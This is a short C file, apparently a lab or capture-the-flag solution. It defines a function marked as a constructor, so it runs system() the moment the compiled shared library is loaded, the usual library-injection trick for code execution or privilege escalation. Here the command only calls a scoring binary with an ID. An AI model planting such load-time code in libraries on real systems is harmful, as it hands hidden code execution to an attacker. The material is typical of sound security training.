	#include<stdio.h>
	#include<stdlib.h>
	 
	static void malicious() __attribute__((constructor));
	 
	void malicious() {
	    system("/usr/local/bin/score 468321fc-2e0b-4461-86e7-d6e2d51606f3");
	}
